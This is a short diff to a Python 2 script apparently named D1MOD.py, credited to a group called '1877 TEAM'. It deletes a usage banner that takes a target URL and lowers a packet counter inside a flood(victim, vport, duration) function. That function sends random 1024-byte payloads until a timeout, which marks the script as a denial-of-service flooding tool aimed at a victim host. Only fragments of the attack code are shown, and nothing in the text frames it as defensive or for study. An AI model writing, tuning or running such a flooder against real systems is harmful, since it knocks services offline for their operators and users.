@@ -5,12 +5,7 @@ import sys
 
 
 
-def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python2 D1MOD.py <url>'
-	print 'EXAMPLE : python2 D1MOD.py https://giv.tr'
-	print '1877 TEAM https://1877.team/'
-	print '---------------------------------------------------'
+
 
   
 
@@ -21,7 +16,7 @@ def flood(victim, vport, duration):
     # 1024 representes one byte to the server
     bytes = random._urandom(1024)
     timeout =  time.time() + duration
-    sent = 1000000
+    sent = 3000
 
     while 1:
         if time.time() > timeout:
